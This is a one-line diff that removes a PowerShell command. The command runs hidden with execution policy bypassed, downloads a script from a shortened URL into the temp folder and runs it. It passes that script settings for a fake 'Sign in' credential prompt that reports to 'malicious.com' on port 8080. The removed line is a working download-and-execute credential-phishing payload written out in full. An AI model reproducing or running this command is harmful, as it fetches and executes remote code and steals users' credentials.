@@ -1,1 +1,0 @@
-powershell -NoP -NonI -W Hidden -Exec Bypass "Invoke-RestMethod -uri "https://bit.ly/completlyinnocent" -OutFile $env:TEMP\lolz.ps1"; Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file $env:temp\lolz.ps1 -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080"
